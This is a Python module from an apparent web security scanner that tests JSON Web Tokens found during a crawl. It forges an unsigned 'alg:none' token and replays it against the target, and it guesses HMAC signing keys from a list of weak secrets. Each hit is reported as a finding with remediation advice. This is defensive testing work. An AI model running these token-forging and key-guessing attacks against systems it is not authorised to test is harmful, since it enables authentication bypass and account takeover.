import base64
import json
import logging
import re
import hmac
import hashlib
from core.finding import Finding
from core.http_client import make_client

logger = logging.getLogger(__name__)

JWT_RE = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*')

WEAK_SECRETS = ["secret", "password", "123456", "key", "jwt", "token",
                 "test", "admin", "letmein", "changeme", "supersecret"]


def _b64_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


class JwtAttacks:
    async def run(self, ctx: dict) -> list[Finding]:
        url = ctx["target_url"]
        limiter = ctx["limiter"]
        findings = []

        tokens = self._collect_tokens(ctx)
        if not tokens:
            logger.info("JWT: no tokens found in crawl results")
            return []

        for token in tokens:
            parts = token.split(".")
            if len(parts) != 3:
                continue

            try:
                header = json.loads(_b64_decode(parts[0]))
                payload = json.loads(_b64_decode(parts[1]))
            except Exception:
                continue

            alg = header.get("alg", "")
            logger.info(f"JWT found: alg={alg} sub={payload.get('sub', '?')}")

            none_finding = await self._test_none_alg(token, header, payload, parts, url, limiter)
            if none_finding:
                findings.append(none_finding)

            weak_finding = self._test_weak_secret(token, parts, payload, url)
            if weak_finding:
                findings.append(weak_finding)

        return findings

    def _collect_tokens(self, ctx: dict) -> list[str]:
        tokens = []

        # 1. JWTs in JS files (recon phase — stored under "JsAnalysis" key)
        js_data = ctx.get("recon", {}).get("JsAnalysis", {})
        for s in js_data.get("secrets_found", []):
            hit = s.get("snippet", "")
            for m in JWT_RE.findall(hit):
                tokens.append(m)

        # 2. JWTs in cookie values discovered by the crawler
        for cookie in ctx.get("cookies", []):
            val = cookie.get("value", "") if isinstance(cookie, dict) else str(cookie)
            for m in JWT_RE.findall(val):
                tokens.append(m)

        # 3. JWTs anywhere in the endpoint list (some apps embed tokens in URLs)
        for ep in ctx.get("endpoints", []):
            for m in JWT_RE.findall(ep):
                tokens.append(m)

        return list(set(tokens))

    async def _test_none_alg(self, original: str, header: dict, payload: dict,
                              parts: list, url: str, limiter) -> Finding | None:
        fake_header = dict(header)
        fake_header["alg"] = "none"
        none_token = (
            _b64_encode(json.dumps(fake_header).encode()) + "." +
            parts[1] + "."
        )
        try:
            async with limiter.acquire():
                async with make_client() as client:
                    r = await client.get(url, headers={
                        "Authorization": f"Bearer {none_token}",
                    })
            if r.status_code < 400:
                return Finding(
                    title="JWT Algorithm Confusion: 'none' Accepted",
                    severity="Critical",
                    description="Server accepted a JWT with alg:none — signature verification is disabled.",
                    affected_url=url,
                    proof=f"Token (alg:none): {none_token[:100]}...\nHTTP {r.status_code}",
                    remediation="Reject JWTs with alg:none. Whitelist only expected algorithms server-side.",
                    impact=5, likelihood=5,
                    module="JwtAttacks",
                    references=["https://portswigger.net/web-security/jwt"],
                )
        except Exception as e:
            logger.debug(f"JWT none test error: {e}")
        return None

    def _test_weak_secret(self, token: str, parts: list, payload: dict, url: str) -> Finding | None:
        msg = f"{parts[0]}.{parts[1]}".encode()
        try:
            sig = _b64_decode(parts[2])
        except Exception:
            return None
        for secret in WEAK_SECRETS:
            expected = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            if hmac.compare_digest(expected, sig):
                return Finding(
                    title="JWT Signed With Weak Secret",
                    severity="Critical",
                    description=f"JWT is signed with a weak/guessable secret: '{secret}'.",
                    affected_url=url,
                    proof=f"HMAC-SHA256 verified with secret='{secret}'\nPayload: {payload}",
                    remediation="Use a cryptographically random secret of at least 256 bits for HMAC-signed JWTs, or switch to RS256/ES256.",
                    impact=5, likelihood=4,
                    module="JwtAttacks",
                )
        return None
